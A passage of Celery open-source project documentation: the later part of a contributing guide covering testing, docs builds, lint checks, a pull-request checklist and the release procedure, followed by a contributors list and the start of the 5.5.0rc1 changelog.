``` {.console}
$ pytest --cov=celery --cov-report=xml
```

1.  The coverage XML output will then be located in the `coverage.xml`{.interpreted-text role="file"} file.

#### Running the tests on all supported Python versions {#contributing-tox}

There\'s a `tox`{.interpreted-text role="pypi"} configuration file in the top directory of the distribution.

To run the tests for all supported Python versions simply execute:

``` {.console}
$ tox
```

Use the `tox -e` option if you only want to test specific Python versions:

``` {.console}
$ tox -e 3.7
```

### Building the documentation

To build the documentation, you need to install the dependencies listed in `requirements/docs.txt`{.interpreted-text role="file"} and `requirements/default.txt`{.interpreted-text role="file"}:

``` {.console}
$ pip install -U -r requirements/docs.txt
$ pip install -U -r requirements/default.txt
```

Additionally, to build with no warnings, you will need to install the following packages:

``` {.console}
$ apt-get install texlive texlive-latex-extra dvipng
```

After these dependencies are installed, you should be able to build the docs by running:

``` {.console}
$ cd docs
$ rm -rf _build
$ make html
```

Make sure there are no errors or warnings in the build output. After building succeeds, the documentation is available at `_build/html`{.interpreted-text role="file"}.

### Build the documentation using Docker {#contributing-verify}

Build the documentation by running:

``` {.console}
$ docker compose -f docker/docker-compose.yml up --build docs
```

The service will start a local docs server at `:7000`. The server is using `sphinx-autobuild` with the `--watch` option enabled, so you can live edit the documentation. Check the additional options and configs in `docker/docker-compose.yml`{.interpreted-text role="file"}

### Verifying your contribution

To use these tools, you need to install a few dependencies. These dependencies can be found in `requirements/pkgutils.txt`{.interpreted-text role="file"}.

Installing the dependencies:

``` {.console}
$ pip install -U -r requirements/pkgutils.txt
```

#### pyflakes & PEP-8

To ensure that your changes conform to `8`{.interpreted-text role="pep"} and to run pyflakes execute:

``` {.console}
$ make flakecheck
```

To not return a negative exit code when this command fails, use the `flakes` target instead:

``` {.console}
$ make flakes
```

#### API reference

To make sure that all modules have a corresponding section in the API reference, please execute:

``` {.console}
$ make apicheck
```

If files are missing, you can add them by copying an existing reference file.

If the module is internal, it should be part of the internal reference located in `docs/internals/reference/`{.interpreted-text role="file"}. If the module is public, it should be located in `docs/reference/`{.interpreted-text role="file"}.

For example, if reference is missing for the module `celery.worker.awesome` and this module is considered part of the public API, use the following steps:

Use an existing file as a template:

``` {.console}
$ cd docs/reference/
$ cp celery.schedules.rst celery.worker.awesome.rst
```

Edit the file using your favorite editor:

``` {.console}
$ vim celery.worker.awesome.rst

    # change every occurrence of ``celery.schedules`` to
    # ``celery.worker.awesome``
```

Edit the index using your favorite editor:

``` {.console}
$ vim index.rst

    # Add ``celery.worker.awesome`` to the index.
```

Commit your changes:

``` {.console}
# Add the file to git
$ git add celery.worker.awesome.rst
$ git add index.rst
$ git commit celery.worker.awesome.rst index.rst \
    -m "Adds reference for celery.worker.awesome"
```

#### Isort

[Isort](https://isort.readthedocs.io/en/latest/) is a python utility to help sort imports alphabetically and separated into sections. The Celery project uses isort to better maintain imports on every module. Please run isort if there are any new modules or the imports on an existent module had to be modified.

``` {.console}
$ isort my_module.py # Run isort for one file
$ isort -rc . # Run it recursively
$ isort m_module.py --diff # Do a dry-run to see the proposed changes
```

### Creating pull requests {#contributing-pull-requests}

When your feature/bugfix is complete, you may want to submit a pull request, so that it can be reviewed by the maintainers.

Before submitting a pull request, please make sure you go through this checklist to make it easier for the maintainers to accept your proposed changes:

-   

    \[ \] Make sure any change or new feature has a unit and/or integration test.

    :   If a test is not written, a label will be assigned to your PR with the name `Needs Test Coverage`.

-   

    \[ \] Make sure unit test coverage does not decrease.

    :   `pytest -xv --cov=celery --cov-report=xml --cov-report term`. You can check the current test coverage here: <https://codecov.io/gh/celery/celery>

-   

    \[ \] Run `pre-commit` against the code. The following commands are valid

    :   and equivalent.:

        ``` {.console}
        $ pre-commit run --all-files
        $ tox -e lint
        ```

-   

    \[ \] Build api docs to make sure everything is OK. The following commands are valid

    :   and equivalent.:

        ``` {.console}
        $ make apicheck
        $ cd docs && sphinx-build -b apicheck -d _build/doctrees . _build/apicheck
        $ tox -e apicheck
        ```

-   

    \[ \] Build configcheck. The following commands are valid

    :   and equivalent.:

        ``` {.console}
        $ make configcheck
        $ cd docs && sphinx-build -b configcheck -d _build/doctrees   . _build/configcheck
        $ tox -e configcheck
        ```

-   

    \[ \] Run `bandit` to make sure there\'s no security issues. The following commands are valid

    :   and equivalent.:

        ``` {.console}
        $ pip install -U bandit
        $ bandit -b bandit.json celery/
        $ tox -e bandit
        ```

-   

    \[ \] Run unit and integration tests for every python version. The following commands are valid

    :   and equivalent.:

        ``` {.console}
        $ tox -v
        ```

-   \[ \] Confirm `isort` on any new or modified imports:

    > ``` {.console}
    > $ isort my_module.py --diff
    > ```

Creating pull requests is easy, and they also let you track the progress of your contribution. Read the [Pull Requests](http://help.github.com/send-pull-requests/) section in the GitHub Guide to learn how this is done.

You can also attach pull requests to existing issues by following the steps outlined here: <https://bit.ly/koJoso>

You can also use [hub](https://hub.github.com/) to create pull requests. Example: <https://theiconic.tech/git-hub-fbe2e13ef4d1>

#### Status Labels

There are [different labels](https://github.com/celery/celery/labels) used to easily manage github issues and PRs. Most of these labels make it easy to categorize each issue with important details. For instance, you might see a `Component:canvas` label on an issue or PR. The `Component:canvas` label means the issue or PR corresponds to the canvas functionality. These labels are set by the maintainers and for the most part external contributors should not worry about them. A subset of these labels are prepended with **Status:**. Usually the **Status:** labels show important actions which the issue or PR needs. Here is a summary of such statuses:

-   **Status: Cannot Reproduce**

    One or more Celery core team member has not been able to reproduce the issue.

-   **Status: Confirmed**

    The issue or PR has been confirmed by one or more Celery core team member.

-   **Status: Duplicate**

    A duplicate issue or PR.

-   **Status: Feedback Needed**

    One or more Celery core team member has asked for feedback on the issue or PR.

-   **Status: Has Testcase**

    It has been confirmed the issue or PR includes a test case. This is particularly important to correctly write tests for any new feature or bug fix.

-   **Status: In Progress**

    The PR is still in progress.

-   **Status: Invalid**

    The issue reported or the PR is not valid for the project.

-   **Status: Needs Documentation**

    The PR does not contain documentation for the feature or bug fix proposed.

-   **Status: Needs Rebase**

    The PR has not been rebased with `main`. It is very important to rebase PRs before they can be merged to `main` to solve any merge conflicts.

-   **Status: Needs Test Coverage**

    Celery uses [codecov](https://codecov.io/gh/celery/celery) to verify code coverage. Please make sure PRs do not decrease code coverage. This label will identify PRs which need code coverage.

-   **Status: Needs Test Case**

    The issue or PR needs a test case. A test case can be a minimal code snippet that reproduces an issue or a detailed set of instructions and configuration values that reproduces the issue reported. If possible a test case can be submitted in the form of a PR to Celery\'s integration suite. The test case will be marked as failed until the bug is fixed. When a test case cannot be run by Celery\'s integration suite, then it\'s better to describe in the issue itself.

-   **Status: Needs Verification**

    This label is used to notify other users we need to verify the test case offered by the reporter and/or we need to include the test in our integration suite.

-   **Status: Not a Bug**

    It has been decided the issue reported is not a bug.

-   **Status: Won\'t Fix**

    It has been decided the issue will not be fixed. Sadly the Celery project does not have unlimited resources and sometimes this decision has to be made. Although, any external contributors are invited to help out even if an issue or PR is labeled as `Status: Won't Fix`.

-   **Status: Works For Me**

    One or more Celery core team members have confirmed the issue reported works for them.

Coding Style
------------

You should probably be able to pick up the coding style from surrounding code, but it is a good idea to be aware of the following conventions.

-   All Python code must follow the `8`{.interpreted-text role="pep"} guidelines.

`pep8`{.interpreted-text role="pypi"} is a utility you can use to verify that your code is following the conventions.

-   Docstrings must follow the `257`{.interpreted-text role="pep"} conventions, and use the following style.

    > Do this:
    >
    > ``` {.python}
    > def method(self, arg):
    >     """Short description.
    >
    >     More details.
    >
    >     """
    > ```
    >
    > or:
    >
    > ``` {.python}
    > def method(self, arg):
    >     """Short description."""
    > ```
    >
    > but not this:
    >
    > ``` {.python}
    > def method(self, arg):
    >     """
    >     Short description.
    >     """
    > ```

-   Lines shouldn\'t exceed 78 columns.

    You can enforce this in `vim`{.interpreted-text role="command"} by setting the `textwidth` option:

    ``` {.vim}
    set textwidth=78
    ```

    If adhering to this limit makes the code less readable, you have one more character to go on. This means 78 is a soft limit, and 79 is the hard limit :)

-   Import order

    > -   Python standard library ([import xxx]{.title-ref})
    > -   Python standard library ([from xxx import]{.title-ref})
    > -   Third-party packages.
    > -   Other modules from the current package.
    >
    > or in case of code using Django:
    >
    > -   Python standard library ([import xxx]{.title-ref})
    > -   Python standard library ([from xxx import]{.title-ref})
    > -   Third-party packages.
    > -   Django packages.
    > -   Other modules from the current package.
    >
    > Within these sections the imports should be sorted by module name.
    >
    > Example:
    >
    > ``` {.python}
    > import threading
    > import time
    >
    > from collections import deque
    > from Queue import Queue, Empty
    >
    > from .platforms import Pidfile
    > from .utils.time import maybe_timedelta
    > ```

-   Wild-card imports must not be used ([from xxx import \*]{.title-ref}).

-   For distributions where Python 2.5 is the oldest support version, additional rules apply:

    > -   Absolute imports must be enabled at the top of every module:
    >
    >         from __future__ import absolute_import
    >
    > -   If the module uses the `with`{.interpreted-text role="keyword"} statement and must be compatible with Python 2.5 (celery isn\'t), then it must also enable that:
    >
    >         from __future__ import with_statement
    >
    > -   Every future import must be on its own line, as older Python 2.5 releases didn\'t support importing multiple features on the same future import line:
    >
    >         # Good
    >         from __future__ import absolute_import
    >         from __future__ import with_statement
    >
    >         # Bad
    >         from __future__ import absolute_import, with_statement
    >
    > > (Note that this rule doesn\'t apply if the package doesn\'t include support for Python 2.5)

-   Note that we use \"new-style\" relative imports when the distribution doesn\'t support Python versions below 2.5

    > This requires Python 2.5 or later:
    >
    > ``` {.python}
    > from . import submodule
    > ```

Contributing features requiring additional libraries {#feature-with-extras}
----------------------------------------------------

Some features like a new result backend may require additional libraries that the user must install.

We use setuptools [extra\_requires]{.title-ref} for this, and all new optional features that require third-party libraries must be added.

1)  Add a new requirements file in [requirements/extras]{.title-ref}

    > For the Cassandra backend this is `requirements/extras/cassandra.txt`{.interpreted-text role="file"}, and the file looks like this:
    >
    > ``` {.text}
    > pycassa
    > ```
    >
    > These are pip requirement files, so you can have version specifiers and multiple packages are separated by newline. A more complex example could be:
    >
    > ``` {.text}
    > # pycassa 2.0 breaks Foo
    > pycassa>=1.0,<2.0
    > thrift
    > ```

2)  Modify `setup.py`

    > After the requirements file is added, you need to add it as an option to `setup.py`{.interpreted-text role="file"} in the `extras_require` section:
    >
    >     extra['extras_require'] = {
    >         # ...
    >         'cassandra': extras('cassandra.txt'),
    >     }

3)  Document the new feature in `docs/includes/installation.txt`{.interpreted-text role="file"}

    > You must add your feature to the list in the `bundles`{.interpreted-text role="ref"} section of `docs/includes/installation.txt`{.interpreted-text role="file"}.
    >
    > After you\'ve made changes to this file, you need to render the distro `README`{.interpreted-text role="file"} file:
    >
    > ``` {.console}
    > $ pip install -U -r requirements/pkgutils.txt
    > $ make readme
    > ```

That\'s all that needs to be done, but remember that if your feature adds additional configuration options, then these needs to be documented in `docs/configuration.rst`{.interpreted-text role="file"}. Also, all settings need to be added to the `celery/app/defaults.py`{.interpreted-text role="file"} module.

Result backends require a separate section in the `docs/configuration.rst`{.interpreted-text role="file"} file.

Contacts {#contact_information}
--------

This is a list of people that can be contacted for questions regarding the official git repositories, PyPI packages Read the Docs pages.

If the issue isn\'t an emergency then it\'s better to `report an issue <reporting-bugs>`{.interpreted-text role="ref"}.

### Committers

#### Ask Solem

github

:   <https://github.com/ask>

twitter

:   <https://twitter.com/#!/asksol>

#### Asif Saif Uddin

github

:   <https://github.com/auvipy>

twitter

:   <https://twitter.com/#!/auvipy>

#### Dmitry Malinovsky

github

:   <https://github.com/malinoff>

twitter

:   <https://twitter.com/__malinoff__>

#### Ionel Cristian Mărieș

github

:   <https://github.com/ionelmc>

twitter

:   <https://twitter.com/ionelmc>

#### Mher Movsisyan

github

:   <https://github.com/mher>

twitter

:   <https://twitter.com/#!/movsm>

#### Omer Katz

github

:   <https://github.com/thedrow>

twitter

:   <https://twitter.com/the_drow>

#### Steeve Morin

github

:   <https://github.com/steeve>

twitter

:   <https://twitter.com/#!/steeve>

#### Josue Balandrano Coronel

github

:   <https://github.com/xirdneh>

twitter

:   <https://twitter.com/eusoj_xirdneh>

#### Tomer Nosrati

github

:   <https://github.com/Nusnus>

twitter

:   <https://x.com/tomer_nosrati>

### Website

The Celery Project website is run and maintained by

#### Mauro Rocco

github

:   <https://github.com/fireantology>

twitter

:   <https://twitter.com/#!/fireantology>

with design by:

#### Jan Henrik Helmers

web

:   <http://www.helmersworks.com>

twitter

:   <https://twitter.com/#!/helmers>

Packages
--------

### `celery`

git

:   <https://github.com/celery/celery>

CI

:   <https://travis-ci.org/#!/celery/celery>

Windows-CI

:   <https://ci.appveyor.com/project/ask/celery>

PyPI

:   `celery`{.interpreted-text role="pypi"}

docs

:   <https://docs.celeryq.dev>

### `kombu`

Messaging library.

git

:   <https://github.com/celery/kombu>

CI

:   <https://travis-ci.org/#!/celery/kombu>

Windows-CI

:   <https://ci.appveyor.com/project/ask/kombu>

PyPI

:   `kombu`{.interpreted-text role="pypi"}

docs

:   <https://kombu.readthedocs.io>

### `amqp`

Python AMQP 0.9.1 client.

git

:   <https://github.com/celery/py-amqp>

CI

:   <https://travis-ci.org/#!/celery/py-amqp>

Windows-CI

:   <https://ci.appveyor.com/project/ask/py-amqp>

PyPI

:   `amqp`{.interpreted-text role="pypi"}

docs

:   <https://amqp.readthedocs.io>

### `vine`

Promise/deferred implementation.

git

:   <https://github.com/celery/vine/>

CI

:   <https://travis-ci.org/#!/celery/vine/>

Windows-CI

:   <https://ci.appveyor.com/project/ask/vine>

PyPI

:   `vine`{.interpreted-text role="pypi"}

docs

:   <https://vine.readthedocs.io>

### `pytest-celery`

Pytest plugin for Celery.

git

:   <https://github.com/celery/pytest-celery>

PyPI

:   `pytest-celery`{.interpreted-text role="pypi"}

docs

:   <https://pytest-celery.readthedocs.io>

### `billiard`

Fork of multiprocessing containing improvements that\'ll eventually be merged into the Python stdlib.

git

:   <https://github.com/celery/billiard>

CI

:   <https://travis-ci.org/#!/celery/billiard/>

Windows-CI

:   <https://ci.appveyor.com/project/ask/billiard>

PyPI

:   `billiard`{.interpreted-text role="pypi"}

### `django-celery-beat`

Database-backed Periodic Tasks with admin interface using the Django ORM.

git

:   <https://github.com/celery/django-celery-beat>

CI

:   <https://travis-ci.org/#!/celery/django-celery-beat>

Windows-CI

:   <https://ci.appveyor.com/project/ask/django-celery-beat>

PyPI

:   `django-celery-beat`{.interpreted-text role="pypi"}

### `django-celery-results`

Store task results in the Django ORM, or using the Django Cache Framework.

git

:   <https://github.com/celery/django-celery-results>

CI

:   <https://travis-ci.org/#!/celery/django-celery-results>

Windows-CI

:   <https://ci.appveyor.com/project/ask/django-celery-results>

PyPI

:   `django-celery-results`{.interpreted-text role="pypi"}

### `librabbitmq`

Very fast Python AMQP client written in C.

git

:   <https://github.com/celery/librabbitmq>

PyPI

:   `librabbitmq`{.interpreted-text role="pypi"}

### `cell`

Actor library.

git

:   <https://github.com/celery/cell>

PyPI

:   `cell`{.interpreted-text role="pypi"}

### `cyme`

Distributed Celery Instance manager.

git

:   <https://github.com/celery/cyme>

PyPI

:   `cyme`{.interpreted-text role="pypi"}

docs

:   <https://cyme.readthedocs.io/>

### Deprecated

-   `django-celery`

git

:   <https://github.com/celery/django-celery>

PyPI

:   `django-celery`{.interpreted-text role="pypi"}

docs

:   <https://docs.celeryq.dev/en/latest/django>

-   `Flask-Celery`

git

:   <https://github.com/ask/Flask-Celery>

PyPI

:   `Flask-Celery`{.interpreted-text role="pypi"}

-   `celerymon`

git

:   <https://github.com/celery/celerymon>

PyPI

:   `celerymon`{.interpreted-text role="pypi"}

-   `carrot`

git

:   <https://github.com/ask/carrot>

PyPI

:   `carrot`{.interpreted-text role="pypi"}

-   `ghettoq`

git

:   <https://github.com/ask/ghettoq>

PyPI

:   `ghettoq`{.interpreted-text role="pypi"}

-   `kombu-sqlalchemy`

git

:   <https://github.com/ask/kombu-sqlalchemy>

PyPI

:   `kombu-sqlalchemy`{.interpreted-text role="pypi"}

-   `django-kombu`

git

:   <https://github.com/ask/django-kombu>

PyPI

:   `django-kombu`{.interpreted-text role="pypi"}

-   `pylibrabbitmq`

Old name for `librabbitmq`{.interpreted-text role="pypi"}.

git

:   `None`{.interpreted-text role="const"}

PyPI

:   `pylibrabbitmq`{.interpreted-text role="pypi"}

Release Procedure
-----------------

### Updating the version number

The version number must be updated in three places:

> -   `celery/__init__.py`{.interpreted-text role="file"}
> -   `docs/include/introduction.txt`{.interpreted-text role="file"}
> -   `README.rst`{.interpreted-text role="file"}

The changes to the previous files can be handled with the \[[bumpversion]{.title-ref} command line tool\] (<https://pypi.org/project/bumpversion/>). The corresponding configuration lives in `.bumpversion.cfg`{.interpreted-text role="file"}. To do the necessary changes, run:

``` {.console}
$ bumpversion
```

After you have changed these files, you must render the `README`{.interpreted-text role="file"} files. There\'s a script to convert sphinx syntax to generic reStructured Text syntax, and the make target [readme]{.title-ref} does this for you:

``` {.console}
$ make readme
```

Now commit the changes:

``` {.console}
$ git commit -a -m "Bumps version to X.Y.Z"
```

and make a new version tag:

``` {.console}
$ git tag vX.Y.Z
$ git push --tags
```

### Releasing

Commands to make a new public stable release:

``` {.console}
$ make distcheck  # checks pep8, autodoc index, runs tests and more
$ make dist  # NOTE: Runs git clean -xdf and removes files not in the repo.
$ python setup.py sdist upload --sign --identity='Celery Security Team'
$ python setup.py bdist_wheel upload --sign --identity='Celery Security Team'
```

If this is a new release series then you also need to do the following:

-   

    Go to the Read The Docs management interface at:

    :   <https://readthedocs.org/projects/celery/?fromdocs=celery>

-   Enter \"Edit project\"

    > Change default branch to the branch of this series, for example, use the `2.4` branch for the 2.4 series.

-   Also add the previous version under the \"versions\" tab.


---

CONTRIBUTORS.txt

---

Every contribution to Celery is as important to us,
as every coin in the money bin is to Scrooge McDuck.

The first commit to the Celery codebase was made on
Fri Apr 24 13:30:00 2009 +0200, and has since
then been improved by many contributors.

Everyone who have ever contributed to Celery should be in
this list, but in a recent policy change it has been decided
that everyone must add themselves here, and not be added
by others, so it's currently incomplete waiting for everyone
to add their names.

The list of authors added before the policy change can be found in docs/AUTHORS.txt.

--

Contributor offers to license certain software (a “Contribution” or multiple
“Contributions”) to Celery, and Celery agrees to accept said Contributions,
under the terms of the BSD open source license.
Contributor understands and agrees that Celery shall have the irrevocable and perpetual right to make
and distribute copies of any Contribution, as well as to create and distribute collective works and
derivative works of any Contribution, under the BSD License.

Contributors
------------

Asif Saif Uddin, 2016/08/30
Ask Solem, 2012/06/07
Sean O'Connor, 2012/06/07
Patrick Altman, 2012/06/07
Chris St. Pierre, 2012/06/07
Jeff Terrace, 2012/06/07
Mark Lavin, 2012/06/07
Jesper Noehr, 2012/06/07
Brad Jasper, 2012/06/07
Juan Catalano, 2012/06/07
Luke Zapart, 2012/06/07
Roger Hu, 2012/06/07
Honza Král, 2012/06/07
Aaron Elliot Ross, 2012/06/07
Alec Clowes, 2012/06/07
Daniel Watkins, 2012/06/07
Timo Sugliani, 2012/06/07
Yury V. Zaytsev, 2012/06/7
Marcin Kuźmiński, 2012/06/07
Norman Richards, 2012/06/07
Kevin Tran, 2012/06/07
David Arthur, 2012/06/07
Bryan Berg, 2012/06/07
Mikhail Korobov, 2012/06/07
Jerzy Kozera, 2012/06/07
Ben Firshman, 2012/06/07
Jannis Leidel, 2012/06/07
Chris Rose, 2012/06/07
Julien Poissonnier, 2012/06/07
Łukasz Oleś, 2012/06/07
David Strauss, 2012/06/07
Chris Streeter, 2012/06/07
Thomas Johansson, 2012/06/07
Ales Zoulek, 2012/06/07
Clay Gerrard, 2012/06/07
Matt Williamson, 2012/06/07
Travis Swicegood, 2012/06/07
Jeff Balogh, 2012/06/07
Harm Verhagen, 2012/06/07
Wes Winham, 2012/06/07
David Cramer, 2012/06/07
Steeve Morin, 2012/06/07
Mher Movsisyan, 2012/06/08
Chris Peplin, 2012/06/07
Florian Apolloner, 2012/06/07
Juarez Bochi, 2012/06/07
Christopher Angove, 2012/06/07
Jason Pellerin, 2012/06/07
Miguel Hernandez Martos, 2012/06/07
Neil Chintomby, 2012/06/07
Mauro Rocco, 2012/06/07
Ionut Turturica, 2012/06/07
Adriano Petrich, 2012/06/07
Michael Elsdörfer, 2012/06/07
Kornelijus Survila, 2012/06/07
Stefán Kjartansson, 2012/06/07
Keith Perkins, 2012/06/07
Flavio Percoco, 2012/06/07
Wes Turner, 2012/06/07
Vitaly Babiy, 2012/06/07
Tayfun Sen, 2012/06/08
Gert Van Gool, 2012/06/08
Akira Matsuzaki, 2012/06/08
Simon Josi, 2012/06/08
Sam Cooke, 2012/06/08
Frederic Junod, 2012/06/08
Roberto Gaiser, 2012/06/08
Piotr Sikora, 2012/06/08
Chris Adams, 2012/06/08
Branko Čibej, 2012/06/08
Vladimir Kryachko, 2012/06/08
Remy Noel 2012/06/08
Jude Nagurney, 2012/06/09
Jonatan Heyman, 2012/06/10
David Miller 2012/06/11
Matthew Morrison, 2012/06/11
Leo Dirac, 2012/06/11
Mark Thurman, 2012/06/11
Dimitrios Kouzis-Loukas, 2012/06/13
Steven Skoczen, 2012/06/17
Loren Abrams, 2012/06/19
Eran Rundstein, 2012/06/24
John Watson, 2012/06/27
Matt Long, 2012/07/04
David Markey, 2012/07/05
Jared Biel, 2012/07/05
Jed Smith, 2012/07/08
Łukasz Langa, 2012/07/10
Rinat Shigapov, 2012/07/20
Hynek Schlawack, 2012/07/23
Paul McMillan, 2012/07/26
Mitar, 2012/07/28
Adam DePue, 2012/08/22
Thomas Meson, 2012/08/28
Daniel Lundin, 2012/08/30
Alexey Zatelepin, 2012/09/18
Sundar Raman, 2012/09/24
Henri Colas, 2012/11/16
Thomas Grainger, 2012/11/29
Marius Gedminas, 2012/11/29
Christoph Krybus, 2013/01/07
Jun Sakai, 2013/01/16
Vlad Frolov, 2013/01/23
Milen Pavlov, 2013/03/08
Pär Wieslander, 2013/03/20
Theo Spears, 2013/03/28
Romuald Brunet, 2013/03/29
Aaron Harnly, 2013/04/04
Peter Brook, 2013/05/09
Muneyuki Noguchi, 2013/04/24
Stas Rudakou, 2013/05/29
Dong Weiming, 2013/06/27
Oleg Anashkin, 2013/06/27
Ross Lawley, 2013/07/05
Alain Masiero, 2013/08/07
Adrien Guinet, 2013/08/14
Christopher Lee, 2013/08/29
Alexander Smirnov, 2013/08/30
Matt Robenolt, 2013/08/31
Jameel Al-Aziz, 2013/10/04
Fazleev Maksim, 2013/10/08
Ian A Wilson, 2013/10/18
Daniel M Taub, 2013/10/22
Matt Wise, 2013/11/06
Michael Robellard, 2013/11/07
Vsevolod Kulaga, 2013/11/16
Ionel Cristian Mărieș, 2013/12/09
Константин Подшумок, 2013/12/16
Antoine Legrand, 2014/01/09
Pepijn de Vos, 2014/01/15
Dan McGee, 2014/01/27
Paul Kilgo, 2014/01/28
Môshe van der Sterre, 2014/01/31
Martin Davidsson, 2014/02/08
Chris Clark, 2014/02/20
Matthew Duggan, 2014/04/10
Brian Bouterse, 2014/04/10
Dmitry Malinovsky, 2014/04/28
Luke Pomfrey, 2014/05/06
Alexey Kotlyarov, 2014/05/16
Ross Deane, 2014/07/11
Tadej Janež, 2014/08/08
Akexander Koshelev, 2014/08/19
Davide Quarta, 2014/08/19
John Whitlock, 2014/08/19
Konstantinos Koukopoulos, 2014/08/24
Albert Yee Wang, 2014/08/29
Andrea Rabbaglietti, 2014/10/02
Joe Jevnik, 2014/10/22
Nathan Van Gheem, 2014/10/28
Gino Ledesma, 2014/10/28
Thomas French, 2014/11/10
Michael Permana, 2014/11/6
William King, 2014/11/21
Bert Vanderbauwhede, 2014/12/18
John Anderson, 2014/12/27
Luke Burden, 2015/01/24
Mickaël Penhard, 2015/02/15
Mark Parncutt, 2015/02/16
Samuel Jaillet, 2015/03/24
Ilya Georgievsky, 2015/03/31
Fatih Sucu, 2015/04/17
James Pulec, 2015/04/19
Alexander Lebedev, 2015/04/25
Frantisek Holop, 2015/05/21
Feanil Patel, 2015/05/21
Jocelyn Delalande, 2015/06/03
Justin Patrin, 2015/08/06
Juan Rossi, 2015/08/10
Piotr Maślanka, 2015/08/24
Gerald Manipon, 2015/10/19
Krzysztof Bujniewicz, 2015/10/21
Sukrit Khera, 2015/10/26
Dave Smith, 2015/10/27
Dennis Brakhane, 2015/10/30
Chris Harris, 2015/11/27
Valentyn Klindukh, 2016/01/15
Wayne Chang, 2016/01/15
Mike Attwood, 2016/01/22
David Harrigan, 2016/02/01
Ahmet Demir, 2016/02/27
Maxime Verger, 2016/02/29
David Pravec, 2016/03/11
Alexander Oblovatniy, 2016/03/10
Komu Wairagu, 2016/04/03
Joe Sanford, 2016/04/11
Takeshi Kanemoto, 2016/04/22
Arthur Vuillard, 2016/04/22
Colin McIntosh, 2016/04/26
Jeremy Zafran, 2016/05/17
Anand Reddy Pandikunta, 2016/06/18
Adriano Martins de Jesus, 2016/06/22
Kevin Richardson, 2016/06/29
Andrew Stewart, 2016/07/04
Xin Li, 2016/08/03
Samuel Giffard, 2016/09/08
Alli Witheford, 2016/09/29
Alan Justino da Silva, 2016/10/14
Marat Sharafutdinov, 2016/11/04
Viktor Holmqvist, 2016/12/02
Rick Wargo, 2016/12/02
zhengxiaowai, 2016/12/07
Michael Howitz, 2016/12/08
Andreas Pelme, 2016/12/13
Mike Chen, 2016/12/20
Alejandro Pernin, 2016/12/23
Yuval Shalev, 2016/12/27
Morgan Doocy, 2017/01/02
Arcadiy Ivanov, 2017/01/08
Ryan Hiebert, 2017/01/20
Jianjian Yu, 2017/04/09
Brian May, 2017/04/10
Dmytro Petruk, 2017/04/12
Joey Wilhelm, 2017/04/12
Yoichi Nakayama, 2017/04/25
Simon Schmidt, 2017/05/19
Anthony Lukach, 2017/05/23
Samuel Dion-Girardeau, 2017/05/29
Aydin Sen, 2017/06/14
Vinod Chandru, 2017/07/11
Preston Moore, 2017/06/18
Nicolas Mota, 2017/08/10
David Davis, 2017/08/11
Martial Pageau, 2017/08/16
Sammie S. Taunton, 2017/08/17
Kxrr, 2017/08/18
Mads Jensen, 2017/08/20
Markus Kaiserswerth, 2017/08/30
Andrew Wong, 2017/09/07
Arpan Shah, 2017/09/12
Tobias 'rixx' Kunze, 2017/08/20
Mikhail Wolfson, 2017/12/11
Matt Davis, 2017/12/13
Alex Garel, 2018/01/04
Régis Behmo 2018/01/20
Igor Kasianov, 2018/01/20
Derek Harland, 2018/02/15
Chris Mitchell, 2018/02/27
Josue Balandrano Coronel, 2018/05/24
Federico Bond, 2018/06/20
Tom Booth, 2018/07/06
Axel haustant, 2018/08/14
Bruno Alla, 2018/09/27
Artem Vasilyev, 2018/11/24
Victor Mireyev, 2018/12/13
Florian Chardin, 2018/10/23
Shady Rafehi, 2019/02/20
Fabio Todaro, 2019/06/13
Shashank Parekh, 2019/07/11
Arel Cordero, 2019/08/29
Kyle Johnson, 2019/09/23
Dipankar Achinta, 2019/10/24
Sardorbek Imomaliev, 2020/01/24
Maksym Shalenyi, 2020/07/30
Frazer McLean, 2020/09/29
Henrik Bruåsdal, 2020/11/29
Tom Wojcik, 2021/01/24
Ruaridh Williamson, 2021/03/09
Garry Lawrence, 2021/06/19
Patrick Zhang, 2017/08/19
Konstantin Kochin, 2021/07/11
kronion, 2021/08/26
Gabor Boros, 2021/11/09
Tizian Seehaus, 2022/02/09
Oleh Romanovskyi, 2022/06/09
Tomer Nosrati, 2022/07/17
JoonHwan Kim, 2022/08/01
Kaustav Banerjee, 2022/11/10
Austin Snoeyink 2022/12/06
Jeremy Z. Othieno 2023/07/27
Tomer Nosrati, 2022/17/07
Andy Zickler, 2024/01/18
Johannes Faigle, 2024/06/18
Giovanni Giampauli, 2024/06/26
Shamil Abdulaev, 2024/08/05
Nikos Atlas, 2024/08/26
Marc Bresson, 2024/09/02
Narasux, 2024/09/09


---

Changelog.rst

---

Change history {#changelog}
==============

This document contains change notes for bugfix & new features in the main branch & 5.5.x series, please see `whatsnew-5.5`{.interpreted-text role="ref"} for an overview of what\'s new in Celery 5.5.

5.5.0rc1 {#version-5.5.0rc1}
--------

release-date

:   2024-10-08

release-by

:   Tomer Nosrati

Celery v5.5.0 Release Candidate 1 is now available for testing. Please help us test this version and report any issues.

### Key Highlights

See `whatsnew-5.5`{.interpreted-text role="ref"} or read the main highlights below.

#### Python 3.13 Initial Support

This release introduces the initial support for Python 3.13 with Celery.

After upgrading to this version, please share your feedback on the Python 3.13 support.

#### Soft Shutdown

The soft shutdown is a new mechanism in Celery that sits between the warm shutdown and the cold shutdown. It sets a time limited \"warm shutdown\" period, during which the worker will continue to process tasks that are already running. After the soft shutdown ends, the worker will initiate a graceful cold shutdown, stopping all tasks and exiting.

The soft shutdown is disabled by default, and can be enabled by setting the new configuration option `worker_soft_shutdown_timeout`{.interpreted-text role="setting"}. If a worker is not running any task when the soft shutdown initiates, it will skip the warm shutdown period and proceed directly to the cold shutdown unless the new configuration option `worker_enable_soft_shutdown_on_idle`{.interpreted-text role="setting"} is set to True. This is useful for workers that are idle, waiting on ETA tasks to be executed that still want to enable the soft shutdown anyways.

The soft shutdown can replace the cold shutdown when using a broker with a visibility timeout mechanism, like `Redis <broker-redis>`{.interpreted-text role="ref"} or `SQS <broker-sqs>`{.interpreted-text role="ref"}, to enable a more graceful cold shutdown procedure, allowing the worker enough time to re-queue tasks that were not completed (e.g., `Restoring 1 unacknowledged message(s)`) by resetting the visibility timeout of the unacknowledged messages just before the worker exits completely.

After upgrading to this version, please share your feedback on the new Soft Shutdown mechanism.

Relevant Issues: [\#9213](https://github.com/celery/celery/pull/9213), [\#9231](https://github.com/celery/celery/pull/9231), [\#9238](https://github.com/celery/celery/pull/9238)

-   New `documentation <worker-stopping>`{.interpreted-text role="ref"} for each shutdown type.
-   New `worker_soft_shutdown_timeout`{.interpreted-text role="setting"} configuration option.
-   New `worker_enable_soft_shutdown_on_idle`{.interpreted-text role="setting"} configuration option.

#### REMAP\_SIGTERM

